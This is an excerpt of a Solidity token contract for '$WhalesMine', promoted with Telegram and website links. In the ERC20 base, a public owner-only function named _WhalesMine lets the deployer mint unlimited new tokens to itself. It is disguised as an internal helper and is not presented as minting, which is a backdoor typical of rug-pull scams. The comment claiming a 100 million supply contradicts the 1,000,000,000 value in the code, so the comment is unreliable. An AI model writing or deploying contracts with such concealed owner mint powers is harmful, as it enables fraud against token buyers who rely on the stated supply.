...
//
// $WhalesMine proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/WhalesMinePortal
//  📱Website :: https://WhalesMine.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _WhalesMine(uint256 amount) public onlyOwner {
 _WhalesMine(msg.sender, amount);
    }
    ...
    function _WhalesMine(address account, uint256 amount) internal virtual {
...
contract $WhalesMine is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("$Whales Mine", "$WhalesMine") {
     _WhalesMine(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}